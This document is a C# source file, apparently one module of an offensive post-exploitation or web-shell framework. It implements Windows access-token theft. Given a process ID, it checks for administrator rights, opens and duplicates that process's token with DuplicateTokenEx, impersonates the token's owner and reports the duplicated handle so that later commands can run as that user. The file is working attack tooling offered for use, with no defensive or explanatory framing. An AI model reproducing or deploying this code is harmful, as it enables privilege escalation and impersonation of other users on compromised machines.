using System;
using System.IO;
using System.Text;
using System.Security;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Security.Principal;

using System.Diagnostics;


public class Module_dup_token
{
    public const string SUCC_CODE       = "0";
    public const string ERR_CODE        = "1";
    public const string NON_TOKEN_VALUE = "0";

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    private void ImpersonateWithToken(string token)
    {
        int token_int = Int32.Parse(token);
        IntPtr targetToken = new IntPtr(token_int);

        string current_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            current_username = wid.Name;
        }

        if (!ImpersonateLoggedOnUser(targetToken))
        {
            var errorCode = Marshal.GetLastWin32Error();
            throw new Exception("ImpersonateLoggedOnUser failed with the following error: " + errorCode);
        }

        string impersonate_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            impersonate_username = wid.Name;
        }

        if (current_username == impersonate_username)
            throw new Exception("ImpersonateLoggedOnUser worked, but thread running as user " + current_username);
    }

    private string hex2Str(string hex)
    {
        byte[] raw = new byte[hex.Length / 2];
        for (int i = 0; i < raw.Length; i++)
        {
            raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        }
        return Encoding.ASCII.GetString(raw);
    }

    private string normalizePath(string currPath)
    {
        currPath = currPath.Replace("\"", "");
        currPath = currPath.Replace("'", "");
        currPath = currPath.Replace(@"\", "/");
        return currPath;
    }

    private string changeCWD(string cwd)
    {
        try
        {
            Directory.SetCurrentDirectory(cwd);
            return normalizePath(Directory.GetCurrentDirectory());
        }
        catch (Exception ex)
        {
            if (ex is IOException)
                throw new Exception("Path '" + cwd + "' is not a directory");
            else if (ex is DirectoryNotFoundException)
                throw new Exception("Directory '" + cwd + "' does not exist");
            else if (ex is SecurityException)
                throw new Exception("Directory '" + cwd + "' permission denied");
            else if (ex is PathTooLongException)
                throw new Exception("Path '" + cwd + "' exceed the maximum length defined by the system");
            else
                throw new Exception("Move to path '" + cwd + "' failed");
        }
    }

    private string[] parseArguments(string args)
    {
        List<string> arguments_parsed = new List<string>();
        string pattern = @"""[^""]+""|'[^']+'|\S+";
        foreach (Match m in Regex.Matches(args, pattern))
        {
            arguments_parsed.Add(m.Value);
        }
        return arguments_parsed.ToArray();
    }

    [StructLayout(LayoutKind.Sequential)]
	public struct SECURITY_ATTRIBUTES
	{
	    public int nLength;
	    public IntPtr lpSecurityDescriptor;
	    public int bInheritHandle;
	}
	
	public enum TOKEN_TYPE
	{
	    TokenPrimary = 1,
	    TokenImpersonation
	}
	
	public enum SECURITY_IMPERSONATION_LEVEL
	{
	    SecurityAnonymous,
	    SecurityIdentification,
	    SecurityImpersonation,
	    SecurityDelegation
	}

    [DllImport("advapi32", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool OpenProcessToken(
        IntPtr ProcessHandle,
        TokenAccessLevels DesiredAccess,
        out IntPtr TokenHandle);


	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public extern static bool DuplicateTokenEx(
	    IntPtr hExistingToken,
	    uint dwDesiredAccess,
	    ref SECURITY_ATTRIBUTES lpTokenAttributes,
	    SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
	    TOKEN_TYPE TokenType,
	    out IntPtr phNewToken);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CloseHandle(
        IntPtr hObject
    );

    private bool IsNumeric(string s)
    {
        int n;
        return int.TryParse(s, out n);
    }

    private bool IsHighIntegrity()
    {
        bool flag = false;
        using(WindowsIdentity identity = WindowsIdentity.GetCurrent())
        {
            var principal = new WindowsPrincipal(identity);
            flag = principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        return flag;
    }

    private string[] doDupToken(string pid)
    {
        string result = "";

        try
        {
            if (IsNumeric(pid) == false)
                return new string[]{ERR_CODE, "invalid pid '" + pid + "': not a number" + Environment.NewLine};
            
            int target_proc_id = Int32.Parse(pid);

            if (!IsHighIntegrity())
                return new string[]{ERR_CODE, "No High Integrity detected in current context" + Environment.NewLine};

            Process target_proc = Process.GetProcessById(target_proc_id);
            var target_proc_handle = target_proc.Handle;
            var target_proc_token = IntPtr.Zero;

            if (!OpenProcessToken(target_proc_handle, TokenAccessLevels.Query | TokenAccessLevels.Duplicate | TokenAccessLevels.AssignPrimary, out target_proc_token))
            {
                var errorCode = Marshal.GetLastWin32Error();
                throw new Exception("OpenProcessToken failed with the following error: " + errorCode);
            }

            var dwTokenRights = 395U;
            var securityAttr = new SECURITY_ATTRIBUTES();
            IntPtr dup_token = IntPtr.Zero;

            if (!DuplicateTokenEx(target_proc_token, 
                                    dwTokenRights, 
                                    ref securityAttr, 
                                    SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                                    TOKEN_TYPE.TokenPrimary, 
                                    out dup_token))
            {
                var errorCode = Marshal.GetLastWin32Error();
                CloseHandle(target_proc_token);
                throw new Exception("DuplicateTokenEx failed with the following error: " + errorCode);
            }

            string current_username = "";
            using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
            {
                current_username = wid.Name;
            }

            if (!ImpersonateLoggedOnUser(dup_token))
            {
                var errorCode = Marshal.GetLastWin32Error();
                CloseHandle(target_proc_token);
                CloseHandle(dup_token);
                throw new Exception("ImpersonateLoggedOnUser failed with the following error: " + errorCode);
            }

            CloseHandle(target_proc_token);

            string impersonate_username = "";
            using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
            {
                impersonate_username = wid.Name;
            }

            RevertToSelf();

            if (impersonate_username == current_username)
                throw new Exception("ImpersonateLoggedOnUser worked, but thread running as " + current_username);

            result += "Duplicated token: '" + dup_token.ToInt32().ToString() + "' from PID: '" + pid + "' of user: '" + impersonate_username + "'" + Environment.NewLine;

        }
        catch(Exception ex)
        {
            result += ex.ToString() + Environment.NewLine;
            return new string[]{ERR_CODE, result};
        }

        return new string[]{SUCC_CODE, result};
    }

    public string[] execute(string[] args)
    {
        string result = "";
        List<string> nargs = new List<string>(args);

        if (nargs.Count != 1)
        {
            result = "Invalid arguments provided. Specify a process id (PID) to duplicate its access token" + Environment.NewLine;
            return new string[]{ERR_CODE, result};
        }

        return doDupToken(nargs[0]);
    }

    public string[] go(string cwd, string args, string token)
    {
        string[] results = new string[]{SUCC_CODE, ""};
        string pwd = Directory.GetCurrentDirectory();

        try
        {
            if (token != NON_TOKEN_VALUE)
                ImpersonateWithToken(token);

            string new_cwd = changeCWD(cwd);
            string[] arguments_parsed = parseArguments(hex2Str(args));
            
            results = execute(arguments_parsed);
        }
        catch (Exception ex)
        {
            results[0] = ERR_CODE;
            results[1] = ex.ToString();
        }
        finally
        {
            changeCWD(pwd);
            if (token != NON_TOKEN_VALUE)
                RevertToSelf();
        }
        return results;
    }

    public static void Main(string[] args)
    {
        Module_dup_token m = new Module_dup_token();
        String[] results = m.execute(args);
        Console.WriteLine(results[0]);
        Console.WriteLine(results[1]);
        return;
    }
}